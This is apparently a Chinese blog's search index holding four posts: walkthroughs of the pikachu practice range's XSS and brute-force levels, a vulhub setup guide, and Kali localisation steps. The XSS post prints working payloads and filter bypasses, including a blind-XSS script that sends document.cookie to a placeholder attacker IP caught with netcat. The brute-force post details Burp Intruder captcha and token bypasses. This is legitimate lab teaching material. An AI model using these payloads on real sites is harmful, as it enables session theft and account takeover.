<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pikachu靶场通关秘籍之XSS</title>
      <link href="/archives/77aee975.html"/>
      <url>/archives/77aee975.html</url>
      
        <content type="html"><![CDATA[<h2 id="跨站脚本攻击介绍"><a href="#跨站脚本攻击介绍" class="headerlink" title="跨站脚本攻击介绍"></a>跨站脚本攻击介绍</h2><p><strong>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型:</strong>  </p><pre><code>    1.反射性XSS;    2.存储型XSS;    3.DOM型XSS;XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:  输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;  输出转义：根据输出点的位置对输出到前端的内容进行适当转义;  </code></pre><h2 id="反射型XSS-get"><a href="#反射型XSS-get" class="headerlink" title="反射型XSS(get)"></a>反射型XSS(get)</h2><p>在输入框中输入 <strong>&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</strong> 即可：<br><img src="https://tva1.sinaimg.cn/large/007dA9Dely8h72qa9gnovj31200cotaa.jpg" alt="1">  </p><h2 id="反射型XSS-post"><a href="#反射型XSS-post" class="headerlink" title="反射型XSS(post)"></a>反射型XSS(post)</h2><p>先登录进去,同样在输入框中输入 <strong>&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</strong> 即可<br><img src="https://tva3.sinaimg.cn/large/007dA9Dely8h72qbu3hrrj30lu0bf3za.jpg" alt="2">  </p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>存储型XSS又称持久型XSS，攻击脚本将被永久地存放在目标服务器的数据库或文件中，具有很高的隐蔽性。  </p><p>同样在输入框中输入**&lt;script&gt;alert(1)&lt;&#x2F;script&gt;**，当有人浏览你的留言时都会触发XSS。<br><img src="https://tva4.sinaimg.cn/large/007dA9Dely8h72qevrimuj30p20bhdgi.jpg" alt="3">  </p><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>查看页面的源代码，找到输入框的位置，可以看到输入的东西在前端进行了过滤，所以只要把前面语法闭合掉，然后添加自己的语法即可,<strong>‘&gt;&lt;img src&#x3D;”#” onmouseover&#x3D;”alert(‘xss’)”&gt;</strong><br><img src="https://tva3.sinaimg.cn/large/007dA9Dely8h72qiwcviej30x209xab9.jpg" alt="4"><br><img src="https://tva1.sinaimg.cn/large/007dA9Dely8h72qjdeqvbj312k0fiq2x.jpg" alt="5">  </p><h2 id="DOM型XSS-X"><a href="#DOM型XSS-X" class="headerlink" title="DOM型XSS-X"></a>DOM型XSS-X</h2><p>同上一样的方法，审查一下js就好:<strong>‘&gt;&lt;img src&#x3D;”#” onmouseover&#x3D;”alert(‘xss’)”&gt;</strong><br><img src="https://tva2.sinaimg.cn/large/007dA9Dely8h72qkwfty6j313n0ipwgp.jpg" alt="6"><br><img src="https://tva1.sinaimg.cn/large/007dA9Dely8h72qlbugx6j30zs0e175c.jpg" alt="7">  </p><h2 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h2><p><strong>盲打就是前端不会做出任何反馈，只有后台管理员知道，你写了什么，这时候我们就要利用nc反弹来获得管理员的cookie，进而可以登录到后台。</strong>  </p><p>我们用这个payload来打<strong>&lt;script&gt;var img&#x3D;document.createElement(“img”);img.src&#x3D;”http:&#x2F;&#x2F;[你的ip]:4444&#x2F;a?”+escape(document.cookie);&lt;&#x2F;script&gt;</strong><br><img src="https://tva2.sinaimg.cn/large/007dA9Dely8h72qq6f5xsj30qo0ebq3t.jpg" alt="8">  </p><p>提交完之后，我们用nc监听:</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p><img src="https://tva4.sinaimg.cn/large/007dA9Dely8h72qrqe7pxj30og0fi0ss.jpg" alt="9"><br><strong>当管理员进入后台，看到我们写的东西后，nc也就监听到了:</strong><br><img src="https://tva4.sinaimg.cn/large/007dA9Dely8h72qtu5ja2j30ne0exjsb.jpg" alt="10">  </p><h2 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h2><p>前端对我们提交的语句进行了过滤，考虑大小写绕过 <strong>&lt;Script&gt;alert(1)&lt;&#x2F;Script&gt;</strong><br><img src="https://tva1.sinaimg.cn/large/007dA9Dely8h72qw9q3t0j310w0e4wfh.jpg" alt="11"></p><h2 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h2><p>我们使用 <strong>‘ onclick&#x3D;’alert(1)’</strong>  payload去打:<br><img src="https://tva2.sinaimg.cn/large/007dA9Dely8h72qyo72yxj319k0gt0u7.jpg" alt="12"></p><h2 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><p>通过分析得知直接使用js伪协议即可:<strong>javascript:alert(1)</strong><br><img src="https://tva3.sinaimg.cn/large/007dA9Dely8h72r1tcffhj31550ggabj.jpg" alt="13"></p><h2 id="XSS之js输出"><a href="#XSS之js输出" class="headerlink" title="XSS之js输出"></a>XSS之js输出</h2><p>通过分析得知， 他将我们输入的字符存到了js代码里面然后进行判断，我们可以根据代码写一个闭合:<strong>‘&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</strong><br><img src="https://tva3.sinaimg.cn/large/007dA9Dely8h72r6iutzwj30s5084wer.jpg" alt="14"><br><img src="https://tva2.sinaimg.cn/large/007dA9Dely8h72r6se4t7j31630ff0sq.jpg" alt="15"></p>]]></content>
      
      
      <categories>
          
          <category> pikachu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pikachu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu靶场通关秘籍之暴力破解</title>
      <link href="/archives/ec9ffc46.html"/>
      <url>/archives/ec9ffc46.html</url>
      
        <content type="html"><![CDATA[<h2 id="暴力破解介绍"><a href="#暴力破解介绍" class="headerlink" title="暴力破解介绍"></a>暴力破解介绍</h2><p><strong>这一关主要通过Burp Suite工具进行暴力破解，主要测试网站是否有弱口令漏洞。</strong></p><h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><p>很简单的一个登录窗口<br><img src="https://tva3.sinaimg.cn/large/007dA9Dely8h72lsmhvupj30rt0a60td.jpg" alt="1"><br>我们先进一个抓包，再把数据报送到BP的 <em>intruder</em> 模块<br><img src="https://tva2.sinaimg.cn/large/007dA9Dely8h72lwbwcnuj30uh0ni429.jpg" alt="2"><br>进入到 <em>intruder</em> 点击 <em>clear</em> 再把<strong>username</strong>和<strong>password</strong>选中，攻击方式选择 <em>Cluster bomb</em><br><img src="https://tva1.sinaimg.cn/large/007dA9Dely8h72m10815mj30r10lqmyn.jpg" alt="3"><br>点击 <em>Payloads</em> 添加字典<br><img src="https://tva4.sinaimg.cn/large/007dA9Dely8h72m3q5we5j30r50hfq3s.jpg" alt="4"><br><img src="https://tva1.sinaimg.cn/large/007dA9Dely8h72m3wwdsbj30pw0fumxo.jpg" alt="5"><br>配置好后，点击右上角的 <em>Start attack</em>,等待攻击完成:<br><img src="https://tva2.sinaimg.cn/large/007dA9Dely8h72m5etc8zj30no0jijtv.jpg" alt="6"><br>得到账号为<strong>admin</strong>，密码为<strong>123456</strong>  </p><p>尝试登录，登录成功。<br><img src="https://tva1.sinaimg.cn/large/007dA9Dely8h72m6opquuj30gv08wjrf.jpg" alt="7">  </p><h2 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h2><p><strong>这是一个带验证码的登录窗口，我要考虑的是爆破的时候，验证码会不会因为页面刷新而刷新。</strong><br><img src="https://tva3.sinaimg.cn/large/007dA9Dely8h72m9hlvdtj30nc0apt9d.jpg" alt="8">  </p><p>和上一关一样，直接尝试暴力破解，发现验证码不会刷新，所以账号密码很容易就出来了。<br><img src="https://tva3.sinaimg.cn/large/007dA9Dely8h72maxcfp6j30r50lvjut.jpg" alt="9"><br>尝试登陆，登录成功<br><img src="https://tva2.sinaimg.cn/large/007dA9Dely8h72mbeiuszj30lj0aat8t.jpg" alt="10">  </p><h2 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h2><p><strong>同样是一个有验证码的登录窗口，用上一关的方法发现不行，验证码一直在变</strong><br><img src="https://tva4.sinaimg.cn/large/007dA9Dely8h72mect36nj30xs0a2dgi.jpg" alt="11">  </p><p>这时候我们F12查看这个页面的js代码:<br><img src="https://tva3.sinaimg.cn/large/007dA9Dely8h72mey8l50j31o20lomzy.jpg" alt="12"><br><strong>发现这验证码是前端验证，前端验证是可以让我们随意更改的，这里提供一种方法，就是直接把浏览器的js功能关了</strong><br><img src="https://tva2.sinaimg.cn/large/007dA9Dely8h72mgvc63tj319h0b6755.jpg" alt="13"><br>js功能关了后，直接就不需要验证码验证了，正常去爆破就好了。<br><img src="https://tva1.sinaimg.cn/large/007dA9Dely8h72mhqoakqj30p30bwwf9.jpg" alt="14">  </p><h2 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破?"></a>token防爆破?</h2><p><strong>最后一关，我们抓包发现其加了token防止我们暴力破解</strong><br><img src="https://tva3.sinaimg.cn/large/007dA9Dely8h72mk7vzvlj30ve0n9gmv.jpg" alt="15">  </p><p>同样，我们先右键 <em>send to intruder</em> 攻击方式选择 <em>Pitchfork</em> 选中<strong>password</strong>和<strong>token</strong>：<br><img src="https://tva1.sinaimg.cn/large/007dA9Dely8h72mmzfwmwj30s70mgta4.jpg" alt="16">  </p><p>在payloads:1里面加入一些字典，然后点击 <em>Options</em>,_Number of threads改为1<br><img src="https://tva4.sinaimg.cn/large/007dA9Dely8h72mp7am1gj30rf0maab0.jpg" alt="17">  </p><p>往下翻，点击 _Grep-Extract_中的 <em>add</em>,找到**name&#x3D;’token’**选中value里面的数字，让他自动生成一个正则表达式:<br><img src="https://tva3.sinaimg.cn/large/007dA9Dely8h72msvwj49j30yw0k0wga.jpg" alt="18"><br>点击ok后，继续往下翻，将 <em>Redirections</em> 中的 _Follow redirections_改为Always。<br><img src="https://tva1.sinaimg.cn/large/007dA9Dely8h72murvgyxj30gl05p0sr.jpg" alt="19">  </p><p>_Options_设置好后，到payloads:2里面，将 _Payload type_改为Recursive grep,在 <em>initial payload for first request</em> 中，将之前数据包中的token写到这里面:<br><img src="https://tva4.sinaimg.cn/large/007dA9Dely8h72my0k6f8j30rf0ly3zd.jpg" alt="20"><br><img src="https://tva2.sinaimg.cn/large/007dA9Dely8h72mzd13cwj30gz09iwep.jpg" alt="21">  </p><p>OK,可以开始暴力破解了:<br><img src="https://tva4.sinaimg.cn/large/007dA9Dely8h72mzyxo4vj30nu0jeab4.jpg" alt="22"><br>得到想要得账号密码，去登录：<br><img src="https://tva3.sinaimg.cn/large/007dA9Dely8h72n0ml8ddj30pr09474s.jpg" alt="23"></p>]]></content>
      
      
      <categories>
          
          <category> pikachu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pikachu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali搭建vulhub靶场</title>
      <link href="/archives/be82d226.html"/>
      <url>/archives/be82d226.html</url>
      
        <content type="html"><![CDATA[<h2 id="vulhub靶场介绍"><a href="#vulhub靶场介绍" class="headerlink" title="vulhub靶场介绍"></a>vulhub靶场介绍</h2><p>vulhub官网:<a href="https://vulhub.org/">https://vulhub.org/</a></p><p>Vulhub是一个基于docker和docker-compose的漏洞环境集合，进入对应目录并执行一条语句即可启动一个全新的漏洞环境，让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。</p><h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><h3 id="一、更新APT："><a href="#一、更新APT：" class="headerlink" title="一、更新APT："></a>一、更新APT：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update </span><br></pre></td></tr></table></figure><p><img src="https://tva4.sinaimg.cn/large/007dA9Dely8h6wza8d4vkj30gt074t9z.jpg" alt="1"></p><h3 id="二、安装https协议，CA证书"><a href="#二、安装https协议，CA证书" class="headerlink" title="二、安装https协议，CA证书"></a>二、安装https协议，CA证书</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install -y apt-transport-https ca-certificates</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007dA9Degy1h6wzowumaqj30gl046dgc.jpg" alt="2"></p><h3 id="三、安装docker"><a href="#三、安装docker" class="headerlink" title="三、安装docker"></a>三、安装docker</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install docker.io</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007dA9Degy1h6wzqk948pj30ej04vmxo.jpg" alt="3"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 查看版本        docker -v</span><br><span class="line">开启docker       systemctl start docker </span><br><span class="line">查看开启的环境    docker ps -a</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007dA9Degy1h6wzsubih1j30gl06jwet.jpg" alt="4"></p><h3 id="四、安装PIP3"><a href="#四、安装PIP3" class="headerlink" title="四、安装PIP3"></a>四、安装PIP3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install python3-pip</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007dA9Degy1h6wztyavytj30fs044wew.jpg" alt="5"></p><h3 id="五、安装docker-compose"><a href="#五、安装docker-compose" class="headerlink" title="五、安装docker-compose"></a>五、安装docker-compose</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install docker-compose</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007dA9Degy1h6wzvopwprj30fh039gm1.jpg" alt="6"></p><h3 id="六、下载vulhub"><a href="#六、下载vulhub" class="headerlink" title="六、下载vulhub"></a>六、下载vulhub</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://gitee.com/puier/vulhub.git</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007dA9Degy1h6wzxzj893j30fb02kt8u.jpg" alt="7"></p><h3 id="七、验证靶场搭建成功"><a href="#七、验证靶场搭建成功" class="headerlink" title="七、验证靶场搭建成功"></a>七、验证靶场搭建成功</h3><p>这里以activemq中的CVE-2015-5654漏洞为例<br>首先进入到CVE-2015-5654文件中去。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd vulhub/activemq/CVE-2015-5654</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007dA9Degy1h6x020k1hfj30d302paa1.jpg" alt="8"></p><p>接着：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对靶场进行编译：docker-compose build</span><br><span class="line">运行靶场：docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007dA9Degy1h6x031dwqmj30f20800tu.jpg" alt="9"></p><p>查看开放的端口：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose ps</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007dA9Degy1h6x04yx5eaj30i706b0tc.jpg" alt="10"><br>发现其开放的端口为61616</p><p>在浏览器中访问:[IP]:61616，其中IP为你kali的ip地址<br><img src="https://tva1.sinaimg.cn/large/007dA9Degy1h6x07e60wuj31pe0y2mz5.jpg" alt="11"><br><strong>访问成功，即代表vulhub搭建成功</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>之前想用centos搭建靶场，用物理机访问，但怎么也访问不了，在网上试了很多办法都没有成功，无奈选择kali。搭建过程也没有什么技巧，跟着步骤敲命令即可，如果下载失败，更改下载源就好了，网上也有教程，这里就不做赘述了。</p>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali汉化教程</title>
      <link href="/archives/4a17b156.html"/>
      <url>/archives/4a17b156.html</url>
      
        <content type="html"><![CDATA[<p>小伙伴有没有因为用不惯全英文kali而烦恼呢，这里教大家如何汉化kali。</p><h2 id="汉化教程"><a href="#汉化教程" class="headerlink" title="汉化教程"></a>汉化教程</h2><p>首先，此命令必须在root命令下进行，所以请先提权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure><p>再输入以下命令:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007dA9Degy1h6x3qefgpcj30aw04wt8o.jpg" alt="1"><br><img src="https://tva1.sinaimg.cn/large/007dA9Degy1h6x3r1jadfj30j60awgly.jpg" alt="2"></p><p>进入到此页面:<br><img src="https://tva1.sinaimg.cn/large/007dA9Degy1h6x3rmnwjqj30p70btwfg.jpg" alt="3"></p><p>选中其中的<strong>en_US.UTF-8 UTF-8 和 zh_CN.UTF-8 UTF-8</strong>（空格键为确定键，TAB键为返回）</p><p>设置完成后，重启：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure><p>最后：<br><img src="https://tva1.sinaimg.cn/large/007dA9Degy1h6x3tp35ghj30wk0jd76i.jpg" alt="4"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>希望对大家有所帮助哦</strong></p>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
